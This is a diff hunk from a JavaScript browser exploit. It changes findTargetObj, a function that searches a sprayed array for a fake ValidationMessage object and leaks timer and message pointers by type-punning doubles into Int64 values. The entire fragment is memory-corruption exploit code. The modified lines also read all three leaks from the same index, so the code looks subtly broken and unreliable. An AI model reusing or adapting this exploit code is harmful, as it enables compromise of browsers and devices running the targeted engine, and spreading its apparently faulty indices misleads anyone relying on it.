@@ -426,14 +426,14 @@ function dumpTargetObj() {
 }
 
 function findTargetObj() {
-	for (let i = 1; i < g_arr_ab_1.length; i++) {
-		if (!Int64.fromDouble(g_arr_ab_1[i][3]).equals(Int64.Zero)) {
+	for (let i = 0; i < g_arr_ab_1.length; i++) {
+		if (!Int64.fromDouble(g_arr_ab_1[i][4]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
-				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
-				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
-				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
+				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
+				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
+				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
 				g_round++;
 			}
 
